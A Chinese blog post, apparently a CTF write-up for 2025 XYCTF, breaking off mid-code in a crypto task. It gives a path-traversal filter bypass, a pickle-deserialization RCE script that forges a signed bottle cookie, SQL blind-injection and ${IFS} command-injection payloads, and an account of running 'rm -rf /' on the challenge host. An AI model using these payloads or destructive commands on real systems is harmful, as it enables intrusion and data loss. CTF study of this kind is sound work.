<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>2025 XYCTF - weyung</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#ffffff"><meta name="application-name" content="weyung&#039;s blog"><meta name="msapplication-TileImage" content="/img/icon.svg"><meta name="msapplication-TileColor" content="#ffffff"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="weyung&#039;s blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><link rel="apple-touch-icon" sizes="1061x1061" href="/img/icon.svg"><link rel="canonical" href="https://blog.weyung.cc/2025/04/04/2025%20XYCTF/"><link rel="alternate" href="/atom.xml" title="weyung" type="application/atom+xml"><link rel="icon" href="/images/wy.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><!--!--><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/wy.png" alt="weyung" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives/">归档</a><a class="navbar-item" href="/categories/">分类</a><a class="navbar-item" href="/tags/">标签</a><a class="navbar-item" href="/links/">友链</a><a class="navbar-item" href="/about/">关于</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-04-04T07:28:00.000Z" title="4/4/2025, 3:28:00 PM">2025-04-04</time>发表</span><span class="level-item"><time dateTime="2025-07-31T07:21:43.697Z" title="7/31/2025, 3:21:43 PM">2025-07-31</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E9%A2%98%E8%A7%A3/">题解</a></span><span class="level-item">37 分钟读完 (大约5611个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">2025 XYCTF</h1><div class="content"><p>又来学 Web 了</p>
<span id="more"></span>

<h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>没憋住，还是看了下密码。<br>唉</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p>白盒，给了个 <code>main.py</code>，直接看代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>应该是先用文件读拿到 <code>secret.txt</code>，过滤很简单，既然不允许 <code>../../</code>，那直接 <code>./.././../</code> bypass 即可。</p>
<p>构造 <code>?filename=./.././../secret.txt</code> 拿到 secret 为 <code>&#39;Hell0_H@cker_Y0u_A3r_Sm@r7&#39;</code>。</p>
<p>观察了下 bottle 的源码，这个 secret 是用来签名的，只有验签通过他才会执行 <code>pickle.loads()</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line">     <span class="string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span></span><br><span class="line"><span class="string">         `secret` must match the one used to create the cookie (see</span></span><br><span class="line"><span class="string">         :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span></span><br><span class="line"><span class="string">         cookie or wrong signature), return a default value. &quot;&quot;&quot;</span></span><br><span class="line">     value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line">     <span class="keyword">if</span> secret:</span><br><span class="line">         <span class="comment"># See BaseResponse.set_cookie for details on signed cookies.</span></span><br><span class="line">         <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">             sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line">             <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">             <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line">                 dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line">                 <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line">                     <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line">         <span class="keyword">return</span> default</span><br><span class="line">     <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure>

<p>搜索得知 <code>pickle</code> 存在反序列化漏洞，最终代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, hmac, os, hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">unicode = <span class="built_in">str</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, unicode):</span><br><span class="line">        <span class="keyword">return</span> s.encode(enc)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&#x27;Hell0_H@cker_Y0u_A3r_Sm@r7&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">value, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Return a signed cookie. To read the cookie, the same `secret` must be</span></span><br><span class="line"><span class="string">        used (see :meth:`BaseResponse.get_cookie`). &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        <span class="comment"># See BaseResponse.set_cookie for details on signed cookies.</span></span><br><span class="line">        msg = base64.b64encode(value)</span><br><span class="line">        <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;!%s?%s&#x27;</span> % (base64.b64encode(<span class="built_in">hash</span>).decode(), msg.decode())</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">&quot;ls -al /&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line">payload = pickle.dumps(exp())</span><br><span class="line">payload = pickletools.optimize(payload)</span><br><span class="line">payload = cookie_encode(payload, secret=secret)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>实现 RCE，试了半天怎么都弹不出 shell，都开始怀疑我命令到底有没有执行了，搞了个 <code>rm -rf /</code>，再读 <code>secret.txt</code>，发现文件没了，说明命令确实有执行，同时发现 <code>/etc/passwd</code> 也有权限删，直接把 flag 读到 <code>/etc/passwd</code> 里了hhh</p>
<p>后来执行一下 <code>ls /bin</code> 才发现根本没有 <code>curl</code>，要弹 shell 的话估计得换个方法。</p>
<p><code>/bin/</code> 内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arch ash base64 bbconfig busybox cat chattr chgrp chmod chown cp date dd df dmesg dnsdomainname dumpkmap echo egrep false fatattr fdflush fgrep fsync getopt grep gunzip gzip hostname ionice iostat ipcalc kbd_mode kill link linux32 linux64 ln login ls lsattr lzop makemime mkdir mknod mktemp more mount mountpoint mpstat mv netstat nice pidof ping ping6 pipe_progress printenv ps pwd reformime rev rm rmdir run-parts sed setpriv setserial sh sleep stat stty su sync tar touch true umount uname usleep watch zcat</span><br></pre></td></tr></table></figure>

<h3 id="ezsql-手动滑稽"><a href="#ezsql-手动滑稽" class="headerlink" title="ezsql(手动滑稽)"></a>ezsql(手动滑稽)</h3><p>随便试几下发现 <code>username</code> 字段可以注入，<code>password</code> 输什么都会被转义，且存在空格过滤，参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/426189.html">这篇文章</a>使用 <code>tab</code> 作为空格绕过，payload 如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27;%09OR%091=1%09#&amp;password=1</span></span><br></pre></td></tr></table></figure>

<p>跳转到 <code>doublecheck.php</code>，搞了一下发现也妹得注入<br>用 bp 看了一下，跳转之前 <code>login.php</code> 是有响应的，可以使用布尔盲注，注意到逗号也被过滤了，使用 <code>substr(xxx from x for y)</code> 代替 <code>substr(xxx, x, y)</code>，脚本如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> <span class="string">&#x27;http://eci-2ze3h973qy7uqodho0gc.cloudeci1.ichunqiu.com/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">value</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">i <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">while <span class="literal">True</span>:</span><br><span class="line">    low, high <span class="operator">=</span> <span class="number">0</span>, <span class="number">127</span></span><br><span class="line">    char_ascii <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    while low <span class="operator">&lt;=</span> high:</span><br><span class="line">        mid <span class="operator">=</span> (low <span class="operator">+</span> high) <span class="operator">/</span><span class="operator">/</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        # payload <span class="operator">=</span> f&quot;&#x27; OR ascii(substr(database() from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;   # testdb</span><br><span class="line">        # payload <span class="operator">=</span> f&quot;&#x27; OR ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;testdb&#x27;) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot; # double_check,<span class="keyword">user</span></span><br><span class="line">        # payload <span class="operator">=</span> f&quot;&#x27; OR ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;double_check&#x27;) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot; # secret</span><br><span class="line">        # payload <span class="operator">=</span> f&quot;&#x27; OR ascii(substr((select group_concat(secret) from double_check) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot; # dtfrtkcc0czkoua9S</span><br><span class="line">        # payload <span class="operator">=</span> f&quot;&#x27; OR ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot; # username,password</span><br><span class="line">        # payload <span class="operator">=</span> f&quot;&#x27; OR ascii(substr((select group_concat(username) from user) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot; # yudeyoushang</span><br><span class="line">        payload <span class="operator">=</span> f&quot;&#x27; OR ascii(substr((select group_concat(password) from user) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot; # zhonghengyisheng</span><br><span class="line"></span><br><span class="line">        data <span class="operator">=</span> &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.replace(&quot; &quot;, &quot;\t&quot;),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">result</span> <span class="operator">=</span> r.post(url, data<span class="operator">=</span>data, allow_redirects<span class="operator">=</span><span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        oracle <span class="operator">=</span> <span class="keyword">not</span> &quot;帐号或密码错误&quot; <span class="keyword">in</span> result.text</span><br><span class="line">        </span><br><span class="line">        if oracle:</span><br><span class="line">            low <span class="operator">=</span> mid <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high <span class="operator">=</span> mid <span class="operator">-</span> <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    if high <span class="operator">&lt;</span> <span class="number">0</span>:</span><br><span class="line">        break</span><br><span class="line">    </span><br><span class="line">    char_ascii <span class="operator">=</span> high <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">    if char_ascii <span class="operator">=</span><span class="operator">=</span> <span class="number">0</span>:</span><br><span class="line">        break</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">value</span> <span class="operator">+</span><span class="operator">=</span> chr(char_ascii)</span><br><span class="line">    print(f&quot;Current: &#123;value&#125;&quot;)</span><br><span class="line">    i <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(f&quot;Final value: &#123;value&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>一点点把东西全注出来，然后用拿到的帐号密码还有 secret 直接登录，进入一个命令执行的页面，无回显，测试了一下存在空格过滤，于是用 <code>$&#123;IFS&#125;</code> 作为空格绕过，试了一下 <code>sleep$&#123;IFS&#125;2</code>，发现响应明显变慢了，说明可以执行，执行 <code>ls$&#123;IFS&#125;/$&#123;IFS&#125;&gt;$&#123;IFS&#125;flag.txt</code>，看到 <code>flag.txt</code> 了，直接 <code>cp$&#123;IFS&#125;/flag.txt$&#123;IFS&#125;flag.txt</code>，再访问 <code>/flag.txt</code> 即可。</p>
<h3 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h3><p>打开是一个拼图网页，刷新几次发现并不能随机到初始即正确的情况，按 <code>F12</code> 发现被拦截，在 bp 看到逻辑是在 <code>index.html</code> 里的 JS 加入了对 <code>contextmenu</code> 和 <code>keydown</code> 的监听，同时发现网页引用了 <code>/js/puzzle.js</code>。<br>那么我们直接访问 <code>/js/puzzle.js</code>，即可绕过拦截打开控制台。<br>然后一看，我嘞个一大坨 JS 啊，直接把代码丢给 DeepSeek，花了几毛钱直接判断出变量 <code>ogde564hc3f4</code> 控制是否完成，本地修改一下 <code>ogde564hc3f4</code> 的值为 <code>true</code>，然后在 2 秒内随便点一下就出 flag 了：<code>flag&#123;Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!&#125;</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><p>给了一个 <code>task.exe</code> 和 <code>flag.txt.enc</code>，用 IDA 一看都是 modules 之流，用 <a target="_blank" rel="noopener" href="https://github.com/WithSecureLabs/python-exe-unpacker">python-exe-unpacker</a> 解包，得到的 <code>task</code> 文件就是 <code>task.sage</code>，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @author: Crypto0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randrange</span><br><span class="line"></span><br><span class="line">N = <span class="number">49</span> </span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">128</span>  </span><br><span class="line">d = <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> q &gt; (<span class="number">6</span> * d + <span class="number">1</span>) * p</span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_T</span>(<span class="params">d1, 